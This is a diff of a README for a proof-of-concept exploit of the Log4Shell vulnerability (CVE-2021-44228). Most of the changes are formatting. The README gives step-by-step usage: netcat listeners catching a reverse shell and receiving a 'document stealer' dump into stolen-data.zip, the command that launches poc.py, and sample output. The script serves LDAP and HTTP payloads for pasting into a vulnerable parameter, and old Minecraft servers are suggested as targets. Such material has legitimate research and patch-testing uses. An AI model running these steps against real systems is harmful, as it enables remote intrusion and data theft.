@@ -1,29 +1,36 @@
 # log4j-shell-poc
-A Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability. <br><br>
+A Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability.
+
 Recently there was a new vulnerability in log4j, a java logging library that is very widely used in the likes of elasticsearch, minecraft and numerous others.
 
 In this repository there is an example vulnerable application and proof-of-concept (POC) exploit of it.
+
 
 Proof-of-concept (POC)
 ----------------------
 
 As a PoC there is a python file that automates the process. 
 
+
 #### Requirements:
 ```bash
 pip install -r requirements.txt
 ```
+
+
 #### Usage:
 
-
 * Start a netcat listener to accept reverse shell connection.<br>
-```py
-nc -lvnp 9001 # For remote shell
-nc -lvnp 9001 > stolen-data.zip # For document stealer
+```bash
+$ nc -lvnp 9001 # For remote shell
+$ nc -lvnp 9001 > stolen-data.zip # For document stealer
 ```
+
+
 * Launch the exploit.<br>
 **Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory.
-```py
+
+```bash
 $ python3 poc.py --userip localhost --webport 8000 --lport 9001
 
 [!] CVE: CVE-2021-44228
@@ -39,8 +46,6 @@ Listening on 0.0.0.0:1389
 
 This script will setup the HTTP server and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.
 
-<br>
-
 
 Vulnerable application
 --------------------------
@@ -49,7 +54,6 @@ Any java application that uses the vulnrable version of log4j would work, I use 
 
 Old versions of the server can be donwloaded in the official Minecraft launcher or at [MCVersions.net](http://www.mcversions.net)
 
-<br>
 
 Getting the Java version.
 --------------------------------------
